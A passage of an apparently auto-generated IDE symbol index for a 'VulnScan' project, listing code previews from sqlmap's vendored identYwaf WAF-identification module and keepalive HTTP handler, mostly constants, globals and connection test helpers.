        "peekOfCode": "VERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "MIN_MATCH_PARTIAL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "MIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "DEFAULTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "DEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "MAX_MATCHES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "MAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "QUICK_RATIO_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "QUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))\n    BANNER = re.sub(VERSION, r\"\\033[01;91m%s\\033[00;49m\" % VERSION, BANNER)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "MAX_JS_CHALLENGE_SNAPLEN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "MAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))\n    BANNER = re.sub(VERSION, r\"\\033[01;91m%s\\033[00;49m\" % VERSION, BANNER)\nelse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "ENCODING_TRANSLATIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "ENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))\n    BANNER = re.sub(VERSION, r\"\\033[01;91m%s\\033[00;49m\" % VERSION, BANNER)\nelse:\n    BANNER = BANNER.replace('`', \"\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "PROXY_TESTING_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "PROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))\n    BANNER = re.sub(VERSION, r\"\\033[01;91m%s\\033[00;49m\" % VERSION, BANNER)\nelse:\n    BANNER = BANNER.replace('`', \"\")\n_ = random.randint(20, 64)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "_",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "_ = random.randint(20, 64)\nDEFAULT_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; %s; rv:%d.0) Gecko/20100101 Firefox/%d.0\" % (NAME, _, _)\nHEADERS = {\"User-Agent\": DEFAULT_USER_AGENT, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"identity\", \"Cache-Control\": \"max-age=0\"}\noriginal = None\noptions = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "DEFAULT_USER_AGENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "DEFAULT_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; %s; rv:%d.0) Gecko/20100101 Firefox/%d.0\" % (NAME, _, _)\nHEADERS = {\"User-Agent\": DEFAULT_USER_AGENT, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"identity\", \"Cache-Control\": \"max-age=0\"}\noriginal = None\noptions = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "HEADERS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "HEADERS = {\"User-Agent\": DEFAULT_USER_AGENT, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"identity\", \"Cache-Control\": \"max-age=0\"}\noriginal = None\noptions = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "original",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "original = None\noptions = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "options",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "options = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "intrusive",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "intrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "heuristic",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "heuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "chained",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "chained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "locked_code",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "locked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "locked_regex",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "locked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "non_blind",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "non_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "seen",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "seen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "blocked",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "blocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "servers",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "servers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "codes",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "codes = set()\nproxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):\n    global proxies_index",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "proxies",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "proxies = list()\nproxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):\n    global proxies_index\n    retval = {}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "proxies_index",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "proxies_index = 0\n_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):\n    global proxies_index\n    retval = {}\n    if proxies:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "_exit",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "_exit = sys.exit\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):\n    global proxies_index\n    retval = {}\n    if proxies:\n        while True:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "ConnectionManager",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class ConnectionManager:\n    \"\"\"\n    The connection manager must be able to:\n      * keep track of all existing\n      \"\"\"\n    def __init__(self):\n        self._lock = threading.Lock()\n        self._hostmap = {} # map hosts to a list of connections\n        self._connmap = {} # map connections to host\n        self._readymap = {} # map connection to ready state",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "KeepAliveHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class KeepAliveHandler:\n    def __init__(self):\n        self._cm = ConnectionManager()\n    #### Connection Management\n    def open_connections(self):\n        \"\"\"return a list of connected hosts and the number of connections\n        to each.  [('foo.com:80', 2), ('bar.org', 1)]\"\"\"\n        return [(host, len(li)) for (host, li) in self._cm.get_all().items()]\n    def close_connection(self, host):\n        \"\"\"close connection(s) to <host>",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "HTTPHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class HTTPHandler(KeepAliveHandler, _urllib.request.HTTPHandler):\n    def __init__(self):\n        KeepAliveHandler.__init__(self)\n    def http_open(self, req):\n        return self.do_open(req)\n    def _get_connection(self, host):\n        return HTTPConnection(host)\nclass HTTPSHandler(KeepAliveHandler, _urllib.request.HTTPSHandler):\n    def __init__(self, ssl_factory=None):\n        KeepAliveHandler.__init__(self)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "HTTPSHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class HTTPSHandler(KeepAliveHandler, _urllib.request.HTTPSHandler):\n    def __init__(self, ssl_factory=None):\n        KeepAliveHandler.__init__(self)\n        if not ssl_factory:\n            try:\n                import sslfactory\n                ssl_factory = sslfactory.get_factory()\n            except ImportError:\n                pass\n        self._ssl_factory = ssl_factory",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "HTTPResponse",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class HTTPResponse(_http_client.HTTPResponse):\n    # we need to subclass HTTPResponse in order to\n    # 1) add readline() and readlines() methods\n    # 2) add close_connection() methods\n    # 3) add info() and geturl() methods\n    # in order to add readline(), read must be modified to deal with a\n    # buffer.  example: readline must read a buffer and then spit back\n    # one line at a time.  The only real alternative is to read one\n    # BYTE at a time (ick).  Once something has been read, it can't be\n    # put back (ok, maybe it can, but that's even uglier than this),",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "HTTPConnection",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class HTTPConnection(_http_client.HTTPConnection):\n    # use the modified response class\n    response_class = HTTPResponse\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    response_class = HTTPResponse\n#########################################################################\n#####   TEST FUNCTIONS\n#########################################################################\ndef error_handler(url):\n    global HANDLE_ERRORS",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "HTTPSConnection",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "class HTTPSConnection(_http_client.HTTPSConnection):\n    response_class = HTTPResponse\n#########################################################################\n#####   TEST FUNCTIONS\n#########################################################################\ndef error_handler(url):\n    global HANDLE_ERRORS\n    orig = HANDLE_ERRORS\n    keepalive_handler = HTTPHandler()\n    opener = _urllib.request.build_opener(keepalive_handler)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "error_handler",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def error_handler(url):\n    global HANDLE_ERRORS\n    orig = HANDLE_ERRORS\n    keepalive_handler = HTTPHandler()\n    opener = _urllib.request.build_opener(keepalive_handler)\n    _urllib.request.install_opener(opener)\n    pos = {0: 'off', 1: 'on'}\n    for i in (0, 1):\n        print(\"  fancy error handling %s (HANDLE_ERRORS = %i)\" % (pos[i], i))\n        HANDLE_ERRORS = i",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "continuity",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def continuity(url):\n    from hashlib import md5\n    format = '%25s: %s'\n    # first fetch the file with the normal http handler\n    opener = _urllib.request.build_opener()\n    _urllib.request.install_opener(opener)\n    fo = _urllib.request.urlopen(url)\n    foo = fo.read()\n    fo.close()\n    m = md5(foo)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "comp",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def comp(N, url):\n    print('  making %i connections to:\\n  %s' % (N, url))\n    sys.stdout.write('  first using the normal urllib handlers')\n    # first use normal opener\n    opener = _urllib.request.build_opener()\n    _urllib.request.install_opener(opener)\n    t1 = fetch(N, url)\n    print('  TIME: %.3f s' % t1)\n    sys.stdout.write('  now using the keepalive handler       ')\n    # now install the keepalive handler and try again",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "fetch",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def fetch(N, url, delay=0):\n    import time\n    lens = []\n    starttime = time.time()\n    for i in _range(N):\n        if delay and i > 0: time.sleep(delay)\n        fo = _urllib.request.urlopen(url)\n        foo = fo.read()\n        fo.close()\n        lens.append(len(foo))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "test_timeout",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def test_timeout(url):\n    global DEBUG\n    dbbackup = DEBUG\n    class FakeLogger:\n        def debug(self, msg, *args): print(msg % args)\n        info = warning = error = debug\n    DEBUG = FakeLogger()\n    print(\"  fetching the file to establish a connection\")\n    fo = _urllib.request.urlopen(url)\n    data1 = fo.read()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "test",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "peekOfCode": "def test(url, N=10):\n    print(\"checking error hander (do this on a non-200)\")\n    try: error_handler(url)\n    except IOError as e:\n        print(\"exiting - exception will prevent further tests\")\n        sys.exit()\n    print()\n    print(\"performing continuity test (making sure stuff isn't corrupted)\")\n    continuity(url)\n    print()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "description": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
